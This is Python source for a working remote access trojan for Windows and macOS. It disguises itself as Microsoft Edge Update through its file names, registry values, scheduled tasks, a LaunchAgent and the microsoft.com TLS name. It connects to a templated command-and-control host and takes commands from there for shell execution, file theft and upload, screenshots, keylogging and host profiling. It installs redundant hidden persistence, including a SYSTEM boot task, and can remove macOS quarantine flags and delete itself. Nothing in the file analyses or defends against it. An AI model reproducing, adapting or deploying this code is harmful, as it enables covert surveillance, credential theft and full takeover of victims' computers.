import ctypes
import hashlib
import io
import json
import os
import platform
import random
import re
import signal
import socket
import ssl
import struct
import subprocess
import sys
import tempfile
import threading
import time
import traceback
from collections import deque
from ctypes import wintypes
from xml.sax.saxutils import escape as xml_escape

if os.name == "nt":
    import winreg

HOST = "@HOST@"
PORT = int("@PORT@")
USE_TLS = "@TLS@" == "1"
PINNED_FP = "@PIN@"

IS_WIN = os.name == "nt"
IS_MAC = sys.platform == "darwin"
EXE_NAME = "MicrosoftEdgeUpdate.exe" if IS_WIN else "MicrosoftEdgeUpdate"
RUN_VALUE = "MicrosoftEdgeUpdate"
TASK_NAME = "MicrosoftEdgeUpdate"
WATCH_NAME = "MicrosoftEdgeUpdateWatch"
BOOT_NAME = "MicrosoftEdgeUpdateBoot"
MUTEX_NAME = "Local\\MSEdgeUpdate-1b7c9e"
LAUNCH_LABEL = "com.microsoft.EdgeUpdate"
IS_FROZEN = bool(getattr(sys, "frozen", False))
USER = os.environ.get("USERNAME") or os.environ.get("USER") or "?"
APP_DIR = (
    os.path.join(os.environ.get("APPDATA", os.path.expanduser("~")), "Microsoft", "EdgeUpdate")
    if IS_WIN else
    os.path.expanduser("~/Library/Application Support/Microsoft/EdgeUpdate")
)
SELF_EXE = sys.executable if IS_FROZEN else os.path.abspath(__file__)
RUN_KEY = r"Software\Microsoft\Windows\CurrentVersion\Run"
STARTUP = (
    os.path.join(os.environ.get("APPDATA", ""), r"Microsoft\Windows\Start Menu\Programs\Startup")
    if IS_WIN else None
)
LAUNCH_PLIST = os.path.expanduser(f"~/Library/LaunchAgents/{LAUNCH_LABEL}.plist")
CREATE_NO_WINDOW = 0x08000000 if IS_WIN else 0
LOCK_FH = None
REEXECED = False

MACHINE_ID = hashlib.sha256(
    (platform.node() + USER + platform.machine()).encode()
).hexdigest()[:12]
KL = deque(maxlen=200_000)
KL_LOCK = threading.Lock()
KL_ON = threading.Event()
CWD = os.path.expanduser("~")
SOCK = None
SEND_LOCK = threading.Lock()
PERSIST_LOCK = threading.Lock()
_last_persist = 0.0


def log(*a):
    pass


def pack(msg, payload=b""):
    h = json.dumps(msg, separators=(",", ":")).encode()
    return struct.pack(">I", len(h)) + h + struct.pack(">Q", len(payload)) + payload


def send(sock, msg, payload=b""):
    with SEND_LOCK:
        sock.sendall(pack(msg, payload))


def recvall(sock, n):
    buf = bytearray()
    while len(buf) < n:
        chunk = sock.recv(min(262144, n - len(buf)))
        if not chunk:
            raise ConnectionError("peer closed")
        buf += chunk
    return bytes(buf)


def recv(sock):
    (hl,) = struct.unpack(">I", recvall(sock, 4))
    if hl > 8_000_000:
        raise ConnectionError("bad header")
    hdr = json.loads(recvall(sock, hl) or b"{}")
    (pl,) = struct.unpack(">Q", recvall(sock, 8))
    if pl > 700_000_000:
        raise ConnectionError("bad payload")
    payload = recvall(sock, pl) if pl else b""
    return hdr, payload


def _session_id():
    if IS_WIN:
        try:
            sid = wintypes.DWORD()
            if ctypes.windll.kernel32.ProcessIdToSessionId(os.getpid(), ctypes.byref(sid)):
                return int(sid.value)
        except Exception:
            pass
        return 0
    try:
        return os.getsid(0)
    except Exception:
        return 0


def _local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    except Exception:
        return "?"
    finally:
        s.close()


def _uptime():
    if IS_WIN:
        try:
            ctypes.windll.kernel32.GetTickCount64.restype = ctypes.c_uint64
            return int(time.time() - ctypes.windll.kernel32.GetTickCount64() / 1000)
        except Exception:
            return 0
    try:
        out = subprocess.run(["sysctl", "-n", "kern.boottime"], capture_output=True,
                             text=True, timeout=10).stdout
        m = re.search(r"sec\s*=\s*(\d+)", out)
        return int(time.time() - int(m.group(1))) if m else 0
    except Exception:
        return 0


def sysinfo():
    return {
        "id": MACHINE_ID,
        "host": platform.node(),
        "user": USER,
        "os": f"{platform.system()} {platform.release()} ({platform.version()})",
        "arch": platform.machine(),
        "ip": _local_ip(),
        "admin": is_admin(),
        "pid": os.getpid(),
        "session": _session_id(),
        "cwd": CWD,
        "uptime": _uptime(),
    }


def run_shell(cmd, timeout=120):
    t0 = time.time()
    try:
        cp = subprocess.run(
            cmd,
            shell=True,
            cwd=CWD if os.path.isdir(CWD) else None,
            capture_output=True,
            timeout=timeout,
            creationflags=CREATE_NO_WINDOW,
        )
        out = cp.stdout + cp.stderr
        rc = cp.returncode
    except subprocess.TimeoutExpired as e:
        out = (e.stdout or b"") + (e.stderr or b"") + f"\n[timeout {timeout}s]".encode()
        rc = -1
    except Exception as e:
        out = str(e).encode()
        rc = -2
    txt = out.decode("utf-8", "replace")
    if len(txt) > 300_000:
        txt = txt[:300_000] + "\n[...truncated]"
    return txt, rc, round(time.time() - t0, 2)


def h_exec(h, p):
    out, rc, dur = run_shell(h.get("cmd", ""), int(h.get("timeout", 120)))
    return {"type": "result", "rc": rc, "dur": dur}, out.encode("utf-8", "replace")


def _resolve(path):
    path = os.path.expandvars(os.path.expanduser(path.strip().strip('"')))
    if path and not os.path.isabs(path):
        path = os.path.join(CWD, path)
    return path


def h_cd(h, p):
    global CWD
    target = _resolve(h.get("path", ""))
    if not target:
        return {"type": "result", "rc": 0}, CWD.encode()
    if not os.path.isdir(target):
        return {"type": "result", "rc": 1}, f"Not a directory: {target}".encode()
    CWD = os.path.abspath(target)
    return {"type": "result", "rc": 0}, CWD.encode()


def h_download(h, p):
    path = _resolve(h.get("path", ""))
    if not os.path.isfile(path):
        return {"type": "result", "rc": 1}, f"No such file: {path}".encode()
    size = os.path.getsize(path)
    if size > 600_000_000:
        return {"type": "result", "rc": 1}, f"Too large: {size} bytes".encode()
    with open(path, "rb") as f:
        data = f.read()
    return {"type": "file", "name": os.path.basename(path), "size": len(data)}, data


def h_upload(h, p):
    path = _resolve(h.get("path", ""))
    parent = os.path.dirname(os.path.abspath(path))
    os.makedirs(parent, exist_ok=True)
    with open(path, "wb") as f:
        f.write(p)
    return {"type": "result", "rc": 0}, f"Wrote {len(p)} bytes to {path}".encode()


def grab_pil():
    from PIL import ImageGrab

    img = ImageGrab.grab(all_screens=True) if IS_WIN else ImageGrab.grab()
    buf = io.BytesIO()
    img.save(buf, "PNG")
    return buf.getvalue()


def grab_mac():
    tmp = tempfile.mktemp(suffix=".png")
    try:
        subprocess.run(["/usr/sbin/screencapture", "-x", "-t", "png", tmp],
                       check=True, capture_output=True, timeout=30)
        with open(tmp, "rb") as f:
            data = f.read()
        if not data:
            raise OSError("empty screenshot")
        return data
    finally:
        try:
            os.remove(tmp)
        except OSError:
            pass


def grab_gdi():
    user32, gdi32 = ctypes.windll.user32, ctypes.windll.gdi32
    sdc = user32.GetDC(0)
    w, h = user32.GetSystemMetrics(78), user32.GetSystemMetrics(79)
    mdc = gdi32.CreateCompatibleDC(sdc)
    bmp = gdi32.CreateCompatibleBitmap(sdc, w, h)
    gdi32.SelectObject(mdc, bmp)
    gdi32.BitBlt(mdc, 0, 0, w, h, sdc, 0, 0, 0x00CC0020)

    class BIH(ctypes.Structure):
        _fields_ = [
            ("biSize", wintypes.DWORD),
            ("biWidth", wintypes.LONG),
            ("biHeight", wintypes.LONG),
            ("biPlanes", wintypes.WORD),
            ("biBitCount", wintypes.WORD),
            ("biCompression", wintypes.DWORD),
            ("biSizeImage", wintypes.DWORD),
            ("biXPelsPerMeter", wintypes.LONG),
            ("biYPelsPerMeter", wintypes.LONG),
            ("biClrUsed", wintypes.DWORD),
            ("biClrImportant", wintypes.DWORD),
        ]

    bi = BIH(ctypes.sizeof(BIH), w, -h, 1, 24, 0, 0, 0, 0, 0, 0)
    stride = ((w * 3 + 3) // 4) * 4
    bits = ctypes.create_string_buffer(stride * h)
    gdi32.GetDIBits(mdc, bmp, 0, h, bits, ctypes.byref(bi), 0)
    out = io.BytesIO()
    out.write(b"BM")
    out.write(struct.pack("<IHHI", 14 + 40 + len(bits.raw), 0, 0, 54))
    out.write(struct.pack("<IiiHHIIiiII", 40, w, -h, 1, 24, 0, len(bits.raw), 0, 0, 0, 0))
    out.write(bits.raw)
    gdi32.DeleteObject(bmp)
    gdi32.DeleteDC(mdc)
    user32.ReleaseDC(0, sdc)
    return out.getvalue()


def h_screen(h, p):
    if IS_MAC:
        try:
            return {"type": "screen", "fmt": "png"}, grab_mac()
        except Exception:
            pass
        data = grab_pil()
        return {"type": "screen", "fmt": "png"}, data
    try:
        data = grab_pil()
    except Exception:
        data = grab_gdi()
    return {"type": "screen", "fmt": "png" if data[:4] == b"\x89PNG" else "bmp"}, data


def h_sysinfo(h, p):
    info = sysinfo()
    lines = [f"{k}: {v}" for k, v in info.items()]
    return {"type": "result", "rc": 0}, "\n".join(lines).encode()


def is_admin():
    if IS_WIN:
        try:
            return bool(ctypes.windll.shell32.IsUserAnAdmin())
        except Exception:
            return False
    try:
        return os.geteuid() == 0
    except Exception:
        return False


def _sha256_file(path):
    h = hashlib.sha256()
    with open(path, "rb") as f:
        for chunk in iter(lambda: f.read(1 << 20), b""):
            h.update(chunk)
    return h.hexdigest()


def _same_file(a, b):
    try:
        return os.path.getsize(a) == os.path.getsize(b) and _sha256_file(a) == _sha256_file(b)
    except OSError:
        return False


def _install_dir():
    if IS_FROZEN:
        d = os.path.dirname(os.path.abspath(SELF_EXE))
        if (os.path.basename(d).lower() == "edgeupdate"
                and os.path.basename(os.path.dirname(d)).lower() == "microsoft"):
            return d
    return APP_DIR


def install_copy():
    if not IS_FROZEN:
        return os.path.abspath(SELF_EXE)
    dest = os.path.join(_install_dir(), EXE_NAME)
    if IS_MAC:
        try:
            subprocess.run(["xattr", "-d", "com.apple.quarantine", SELF_EXE],
                           capture_output=True, timeout=10)
        except Exception:
            pass
    if os.path.abspath(SELF_EXE).lower() == os.path.abspath(dest).lower():
        return dest
    os.makedirs(os.path.dirname(dest), exist_ok=True)
    if os.path.exists(dest) and _same_file(SELF_EXE, dest):
        return dest
    tmp = dest + ".new"
    with open(SELF_EXE, "rb") as src, open(tmp, "wb") as dst:
        for chunk in iter(lambda: src.read(1 << 20), b""):
            dst.write(chunk)
    for _ in range(8):
        try:
            os.replace(tmp, dest)
            break
        except OSError:
            time.sleep(0.4)
    if IS_MAC:
        try:
            os.chmod(dest, 0o755)
        except OSError:
            pass
        try:
            subprocess.run(["xattr", "-d", "com.apple.quarantine", dest],
                           capture_output=True, timeout=10)
        except Exception:
            pass
    return dest


def _user_sid():
    if not IS_WIN:
        return USER
    try:
        out = subprocess.run(
            ["whoami", "/user", "/fo", "csv", "/nh"], capture_output=True,
            text=True, timeout=10, creationflags=CREATE_NO_WINDOW,
        ).stdout.strip()
        parts = [p.strip().strip('"') for p in out.split(",")]
        if parts and parts[-1].upper().startswith("S-1-"):
            return parts[-1]
    except Exception:
        pass
    return (os.environ.get("USERDOMAIN", ".") + "\\" + os.environ.get("USERNAME", ""))


TASK_XML = """<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Author>Microsoft Corporation</Author>
    <Description>Microsoft Edge Update</Description>
  </RegistrationInfo>
  <Triggers>{triggers}</Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>{user}</UserId>
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>{level}</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>false</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
    <RestartOnFailure><Interval>PT1M</Interval><Count>3</Count></RestartOnFailure>
  </Settings>
  <Actions Context="Author">
    <Exec><Command>{cmd}</Command></Exec>
  </Actions>
</Task>
"""


def _register_task(name, triggers, cmd, user, level):
    xml = TASK_XML.format(triggers=triggers, user=xml_escape(user),
                          level=level, cmd=xml_escape(cmd))
    os.makedirs(_install_dir(), exist_ok=True)
    path = os.path.join(_install_dir(), name + ".xml")
    with open(path, "w", encoding="utf-16") as f:
        f.write(xml)
    cp = subprocess.run(
        ["schtasks", "/create", "/xml", path, "/tn", name, "/f"],
        capture_output=True, timeout=30, creationflags=CREATE_NO_WINDOW,
    )
    return cp.returncode == 0


def _set_run(hive, dest):
    key = winreg.OpenKey(hive, RUN_KEY, 0, winreg.KEY_SET_VALUE)
    try:
        winreg.SetValueEx(key, RUN_VALUE, 0, winreg.REG_SZ, f'"{dest}"')
    finally:
        winreg.CloseKey(key)


def _del_run(hive):
    try:
        key = winreg.OpenKey(hive, RUN_KEY, 0, winreg.KEY_SET_VALUE)
    except OSError:
        return
    try:
        winreg.DeleteValue(key, RUN_VALUE)
    except OSError:
        pass
    finally:
        winreg.CloseKey(key)


PLIST_XML = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>Label</key><string>{label}</string>
  <key>ProgramArguments</key><array><string>{cmd}</string></array>
  <key>RunAtLoad</key><true/>
  <key>KeepAlive</key><true/>
  <key>ProcessType</key><string>Interactive</string>
  <key>ThrottleInterval</key><integer>30</integer>
  <key>LimitLoadToSessionType</key><string>Aqua</string>
</dict>
</plist>
"""


def _write_plist(dest):
    xml = PLIST_XML.format(label=LAUNCH_LABEL, cmd=xml_escape(dest))
    os.makedirs(os.path.dirname(LAUNCH_PLIST), exist_ok=True)
    if os.path.exists(LAUNCH_PLIST):
        try:
            with open(LAUNCH_PLIST, encoding="utf-8") as f:
                if f.read() == xml:
                    return
        except OSError:
            pass
    with open(LAUNCH_PLIST, "w", encoding="utf-8") as f:
        f.write(xml)


def ensure_persistence_mac(force=False):
    global _last_persist
    if not force and time.time() - _last_persist < 240:
        return []
    if not PERSIST_LOCK.acquire(blocking=False):
        return []
    try:
        _last_persist = time.time()
        dest = install_copy()
        _write_plist(dest)
        uid = os.getuid()
        target = f"gui/{uid}/{LAUNCH_LABEL}"
        subprocess.run(["launchctl", "bootstrap", f"gui/{uid}", LAUNCH_PLIST],
                       capture_output=True, timeout=20)
        chk = subprocess.run(["launchctl", "print", target],
                             capture_output=True, timeout=20)
        if chk.returncode != 0:
            subprocess.run(["launchctl", "load", "-w", LAUNCH_PLIST],
                           capture_output=True, timeout=20)
            chk = subprocess.run(["launchctl", "print", target],
                                 capture_output=True, timeout=20)
        subprocess.run(["launchctl", "kickstart", target],
                       capture_output=True, timeout=20)
        return ["launchagent ok" if chk.returncode == 0 else "launchagent failed"]
    finally:
        PERSIST_LOCK.release()


def ensure_persistence(force=False):
    global _last_persist
    if not IS_FROZEN:
        return ["agent is not compiled (run as script)"]
    if IS_MAC:
        return ensure_persistence_mac(force)
    if not force and time.time() - _last_persist < 240:
        return []
    if not PERSIST_LOCK.acquire(blocking=False):
        return []
    try:
        _last_persist = time.time()
        notes = []
        admin = is_admin()
        dest = install_copy()
        try:
            _set_run(winreg.HKEY_CURRENT_USER, dest)
            notes.append("run-key ok")
        except Exception as e:
            notes.append(f"run-key failed: {e}")
        if admin:
            try:
                _set_run(winreg.HKEY_LOCAL_MACHINE, dest)
                notes.append("run-key-hklm ok")
            except Exception as e:
                notes.append(f"run-key-hklm failed: {e}")
        try:
            os.makedirs(STARTUP, exist_ok=True)
            vbs = os.path.join(STARTUP, EXE_NAME + ".vbs")
            with open(vbs, "w") as f:
                f.write(f'CreateObject("WScript.Shell").Run """{dest}""", 0, False\r\n')
            try:
                os.remove(os.path.join(STARTUP, EXE_NAME + ".cmd"))
            except OSError:
                pass
            notes.append("startup-folder ok")
        except Exception as e:
            notes.append(f"startup-folder failed: {e}")
        user = _user_sid()
        level = "HighestAvailable" if admin else "LeastPrivilege"
        logon = (f"<LogonTrigger><Enabled>true</Enabled><UserId>{xml_escape(user)}</UserId>"
                 f"<Delay>PT15S</Delay></LogonTrigger>")
        try:
            ok = _register_task(TASK_NAME, logon, dest, user, level)
            notes.append("logon-task ok" if ok else "logon-task failed")
        except Exception as e:
            notes.append(f"logon-task failed: {e}")
        now = time.strftime("%Y-%m-%dT%H:%M:%S")
        watchdog = (f"<TimeTrigger><Repetition><Interval>PT1M</Interval>"
                    f"<StopAtDurationEnd>false</StopAtDurationEnd></Repetition>"
                    f"<StartBoundary>{now}</StartBoundary><Enabled>true</Enabled></TimeTrigger>")
        try:
            ok = _register_task(WATCH_NAME, watchdog, dest, user, level)
            notes.append("watchdog-task ok" if ok else "watchdog-task failed")
        except Exception as e:
            notes.append(f"watchdog-task failed: {e}")
        if admin:
            try:
                cp = subprocess.run(
                    ["schtasks", "/create", "/tn", BOOT_NAME, "/tr", dest, "/sc", "onstart",
                     "/ru", "SYSTEM", "/rl", "HIGHEST", "/delay", "0000:20", "/f"],
                    capture_output=True, timeout=30, creationflags=CREATE_NO_WINDOW,
                )
                notes.append("boot-task ok" if cp.returncode == 0 else "boot-task failed")
            except Exception as e:
                notes.append(f"boot-task failed: {e}")
        return notes
    finally:
        PERSIST_LOCK.release()


def h_persist(h, p):
    if not IS_FROZEN:
        return {"type": "result", "rc": 1}, b"agent is not compiled (run as script)"
    notes = ensure_persistence(force=True)
    return {"type": "result", "rc": 0}, "; ".join(notes).encode()


def _unpersist_mac():
    time.sleep(0.4)
    try:
        subprocess.run(["launchctl", "unload", "-w", LAUNCH_PLIST],
                       capture_output=True, timeout=8)
    except Exception:
        pass
    try:
        os.remove(LAUNCH_PLIST)
    except OSError:
        pass
    try:
        uid = os.getuid()
        subprocess.run(["launchctl", "bootout", f"gui/{uid}/{LAUNCH_LABEL}"],
                       capture_output=True, timeout=8)
    except Exception:
        pass


def h_unpersist(h, p):
    if IS_MAC:
        threading.Thread(target=_unpersist_mac, daemon=True).start()
        return {"type": "result", "rc": 0}, b"persistence removed"
    _del_run(winreg.HKEY_CURRENT_USER)
    _del_run(winreg.HKEY_LOCAL_MACHINE)
    for name in (EXE_NAME + ".cmd", EXE_NAME + ".vbs"):
        try:
            os.remove(os.path.join(STARTUP, name))
        except OSError:
            pass
    for name in (TASK_NAME, WATCH_NAME, BOOT_NAME):
        try:
            subprocess.run(["schtasks", "/delete", "/tn", name, "/f"],
                           capture_output=True, timeout=20, creationflags=CREATE_NO_WINDOW)
        except Exception:
            pass
    return {"type": "result", "rc": 0}, b"persistence removed"


def schedule_self_delete():
    if not IS_FROZEN:
        return

    def _do():
        time.sleep(1)
        dest = os.path.join(_install_dir(), EXE_NAME)
        if IS_MAC:
            try:
                os.remove(dest)
            except OSError:
                pass
            time.sleep(1)
            os._exit(0)
        else:
            subprocess.Popen(
                f'cmd /c ping -n 3 127.0.0.1 >nul & del /f /q "{dest}"',
                shell=True, creationflags=CREATE_NO_WINDOW,
            )

    threading.Thread(target=_do, daemon=True).start()


def h_uninstall(h, p):
    h_unpersist(h, p)
    schedule_self_delete()
    return {"type": "result", "rc": 0}, b"uninstalled"


SPECIAL = {
    0x0D: "\n", 0x09: "\t", 0x08: "[BACK]", 0x1B: "[ESC]", 0x20: " ",
    0x25: "[LEFT]", 0x26: "[UP]", 0x27: "[RIGHT]", 0x28: "[DOWN]",
    0x2E: "[DEL]", 0x24: "[HOME]", 0x23: "[END]", 0x21: "[PGUP]", 0x22: "[PGDN]",
}
IGNORE = set(range(0x10, 0x13)) | {0x5B, 0x5C, 0x14, 0x90, 0x91, 0xA0, 0xA1, 0xA2, 0xA3, 0xA4, 0xA5}


def keylog_loop_win():
    user32 = ctypes.WinDLL("user32", use_last_error=True)
    user32.ToUnicodeEx.argtypes = [
        wintypes.UINT, wintypes.UINT, ctypes.POINTER(ctypes.c_ubyte),
        wintypes.LPWSTR, ctypes.c_int, wintypes.UINT, wintypes.HKL,
    ]
    state = (ctypes.c_ubyte * 256)()
    buf = ctypes.create_unicode_buffer(16)
    prev = {}
    while True:
        if not KL_ON.is_set():
            time.sleep(0.05)
            continue
        try:
            for vk in list(range(0x08, 0xFF)):
                down = bool(user32.GetAsyncKeyState(vk) & 0x8000)
                if down and not prev.get(vk):
                    if vk in IGNORE:
                        pass
                    elif vk in SPECIAL:
                        with KL_LOCK:
                            KL.append(SPECIAL[vk])
                    else:
                        user32.GetKeyboardState(state)
                        n = user32.ToUnicodeEx(vk, 0, state, buf, 16, 0,
                                               user32.GetKeyboardLayout(0))
                        if n > 0:
                            with KL_LOCK:
                                KL.append(buf.value[:n])
                        elif n == -1:
                            user32.ToUnicodeEx(vk, 0, state, buf, 16, 0,
                                               user32.GetKeyboardLayout(0))
                prev[vk] = down
        except Exception:
            pass
        time.sleep(0.012)


MAC_SPECIAL = {
    36: "\n", 48: "\t", 51: "[BACK]", 53: "[ESC]", 117: "[DEL]",
    115: "[HOME]", 119: "[END]", 116: "[PGUP]", 121: "[PGDN]",
    123: "[LEFT]", 124: "[RIGHT]", 125: "[DOWN]", 126: "[UP]",
}
MAC_KEYDOWN = 10
MAC_TAP_CB = None
MAC_CG = None
MAC_TAP_OK = False


def keylog_loop_mac():
    global MAC_TAP_CB, MAC_CG, MAC_TAP_OK
    cg = ctypes.CDLL("/System/Library/Frameworks/CoreGraphics.framework/CoreGraphics")
    cf = ctypes.CDLL("/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation")
    MAC_CG = cg
    cb_type = ctypes.CFUNCTYPE(ctypes.c_void_p, ctypes.c_void_p, ctypes.c_uint32,
                               ctypes.c_void_p, ctypes.c_void_p)
    cg.CGEventTapCreate.restype = ctypes.c_void_p
    cg.CGEventTapCreate.argtypes = [ctypes.c_int, ctypes.c_int, ctypes.c_uint32,
                                    ctypes.c_uint64, cb_type, ctypes.c_void_p]
    cg.CGEventKeyboardGetUnicodeString.restype = None
    cg.CGEventKeyboardGetUnicodeString.argtypes = [
        ctypes.c_void_p, ctypes.c_uint64, ctypes.POINTER(ctypes.c_uint64),
        ctypes.POINTER(ctypes.c_uint16)]
    cg.CGEventGetIntegerValueField.restype = ctypes.c_int64
    cg.CGEventGetIntegerValueField.argtypes = [ctypes.c_void_p, ctypes.c_int]
    cf.CFMachPortCreateRunLoopSource.restype = ctypes.c_void_p
    cf.CFMachPortCreateRunLoopSource.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_int64]
    cf.CFRunLoopGetCurrent.restype = ctypes.c_void_p
    cf.CFRunLoopAddSource.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p]
    cf.CFRunLoopRun.argtypes = []
    cg.CGEventTapEnable.argtypes = [ctypes.c_void_p, ctypes.c_bool]
    tapbox = {"tap": None}

    def on_key(proxy, etype, event, refcon):
        try:
            if etype in (0xFFFFFFFE, 0xFFFFFFFF):
                cg.CGEventTapEnable(tapbox["tap"], True)
                return event
            if KL_ON.is_set() and etype == MAC_KEYDOWN:
                buf = (ctypes.c_uint16 * 32)()
                n = ctypes.c_uint64(0)
                cg.CGEventKeyboardGetUnicodeString(event, 32, ctypes.byref(n), buf)
                text = "".join(chr(buf[i]) for i in range(min(n.value, 32)))
                text = text.replace("\r", "\n")
                text = "".join(ch for ch in text if ch >= " " or ch in "\n\t")
                kc = cg.CGEventGetIntegerValueField(event, 9)
                if not text and kc in MAC_SPECIAL:
                    text = MAC_SPECIAL[kc]
                if text:
                    with KL_LOCK:
                        KL.append(text)
        except Exception:
            pass
        return event

    MAC_TAP_CB = cb_type(on_key)
    while True:
        try:
            cg.CGRequestListenEventAccess.restype = ctypes.c_bool
            cg.CGRequestListenEventAccess()
        except Exception:
            pass
        mask = 1 << MAC_KEYDOWN
        tap = cg.CGEventTapCreate(1, 0, 1, mask, MAC_TAP_CB, None)
        if not tap:
            MAC_TAP_OK = False
            time.sleep(45)
            continue
        MAC_TAP_OK = True
        tapbox["tap"] = tap
        src = cf.CFMachPortCreateRunLoopSource(None, tap, 0)
        loop = cf.CFRunLoopGetCurrent()
        cf.CFRunLoopAddSource(loop, src, ctypes.c_void_p.in_dll(cf, "kCFRunLoopCommonModes"))
        try:
            cf.CFRunLoopRun()
        except Exception:
            time.sleep(30)


def keylog_loop():
    if IS_MAC:
        return keylog_loop_mac()
    if IS_WIN:
        return keylog_loop_win()


def h_keys(h, p):
    action = h.get("action", "dump")
    if action == "start":
        KL_ON.set()
        if IS_MAC and not MAC_TAP_OK:
            return ({"type": "result", "rc": 0},
                    b"keylogger running; grant Input Monitoring to the agent if dumps stay empty")
        return {"type": "result", "rc": 0}, b"keylogger running"
    if action == "stop":
        KL_ON.clear()
        return {"type": "result", "rc": 0}, b"keylogger stopped"
    if action == "clear":
        with KL_LOCK:
            KL.clear()
        return {"type": "result", "rc": 0}, b"keylog buffer cleared"
    with KL_LOCK:
        data = "".join(KL).encode("utf-8", "replace")
    return {"type": "result", "rc": 0}, data or b"(empty)"


def h_sleep(h, p):
    secs = min(int(h.get("secs", 60)), 86400)
    time.sleep(secs)
    return {"type": "result", "rc": 0}, f"slept {secs}s".encode()


def h_ping(h, p):
    return {"type": "pong"}, b""


HANDLERS = {
    "exec": h_exec, "cd": h_cd, "download": h_download, "upload": h_upload,
    "screen": h_screen, "sysinfo": h_sysinfo, "persist": h_persist,
    "unpersist": h_unpersist, "uninstall": h_uninstall, "keys": h_keys,
    "sleep": h_sleep, "ping": h_ping,
}


def _keepalive(sock):
    try:
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    except OSError:
        pass
    if IS_WIN:
        try:
            sock.ioctl(socket.SIO_KEEPALIVE_VALS, (1, 20000, 4000))
        except Exception:
            pass
        return
    idle = getattr(socket, "TCP_KEEPALIVE", None) or getattr(socket, "TCP_KEEPIDLE", None)
    for opt, val in ((idle, 20), (getattr(socket, "TCP_KEEPINTVL", None), 4),
                     (getattr(socket, "TCP_KEEPCNT", None), 3)):
        if opt is not None:
            try:
                sock.setsockopt(socket.IPPROTO_TCP, opt, val)
            except OSError:
                pass


def connect():
    global SOCK
    raw = socket.create_connection((HOST, PORT), timeout=10)
    _keepalive(raw)
    if USE_TLS:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        sock = ctx.wrap_socket(raw, server_hostname="microsoft.com")
        if PINNED_FP:
            der = sock.getpeercert(binary_form=True) or b""
            if hashlib.sha256(der).hexdigest() != PINNED_FP:
                raise ConnectionError("certificate pin mismatch")
    else:
        sock = raw
    SOCK = sock
    send(sock, {"type": "hello", "info": sysinfo(), "ver": "1.3.195.17",
                "tls": USE_TLS}, b"")
    beast = sysinfo()
    send(sock, {"type": "result", "rc": 0},
         f"connected: {beast['host']}\\{beast['user']} ({beast['ip']})".encode())
    return sock


def serve(sock):
    sock.settimeout(90)
    while True:
        try:
            hdr, payload = recv(sock)
        except socket.timeout:
            continue
        mtype = hdr.get("type", "")
        fn = HANDLERS.get(mtype)
        if not fn:
            send(sock, {"type": "result", "rc": 1, "rid": hdr.get("rid", 0)},
                 f"unknown command: {mtype}".encode())
            continue
        try:
            out_hdr, out = fn(hdr, payload)
        except Exception:
            out_hdr, out = {"type": "result", "rc": 1}, traceback.format_exc().encode()
        out_hdr["rid"] = hdr.get("rid", 0)
        send(sock, out_hdr, out)


def single_instance():
    global LOCK_FH
    if IS_MAC:
        import fcntl

        os.makedirs(APP_DIR, exist_ok=True)
        path = os.path.join(APP_DIR, ".agent.lock")
        fh = open(path, "a+")
        try:
            fcntl.flock(fh, fcntl.LOCK_EX | fcntl.LOCK_NB)
        except OSError:
            fh.close()
            return None
        LOCK_FH = fh
        return fh
    kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
    kernel32.CreateMutexW.argtypes = [wintypes.LPVOID, wintypes.BOOL, wintypes.LPCWSTR]
    kernel32.CreateMutexW.restype = wintypes.HANDLE
    handle = kernel32.CreateMutexW(None, False, MUTEX_NAME)
    if not handle:
        return None
    if ctypes.get_last_error() == 183:
        kernel32.CloseHandle(handle)
        return None
    return handle


def agent_loop():
    global REEXECED, LOCK_FH
    mutex = single_instance()
    if mutex is None:
        try:
            ensure_persistence()
        except Exception:
            pass
        return
    threading.Thread(target=keylog_loop, daemon=True).start()
    delay = 1.0
    while True:
        t0 = time.time()
        sock = None
        try:
            ensure_persistence()
        except Exception:
            pass
        if IS_MAC and IS_FROZEN:
            dest = os.path.join(APP_DIR, EXE_NAME)
            if (not REEXECED and os.path.realpath(SELF_EXE) != os.path.realpath(dest)
                    and os.access(dest, os.X_OK)):
                REEXECED = True
                try:
                    if LOCK_FH:
                        LOCK_FH.close()
                        LOCK_FH = None
                    os.execv(dest, [dest])
                except OSError:
                    pass
        try:
            sock = connect()
            serve(sock)
        except Exception:
            pass
        finally:
            try:
                if sock:
                    sock.close()
            except Exception:
                pass
        if time.time() - t0 > 15:
            delay = 1.0
        time.sleep(delay + random.uniform(0, delay * 0.35))
        delay = min(delay * 1.7, 30.0)


def main():
    if IS_MAC:
        try:
            signal.signal(signal.SIGTERM, signal.SIG_IGN)
        except Exception:
            pass
    while True:
        try:
            agent_loop()
            return
        except Exception:
            time.sleep(3)


if __name__ == "__main__":
    try:
        main()
    except Exception:
        time.sleep(5)
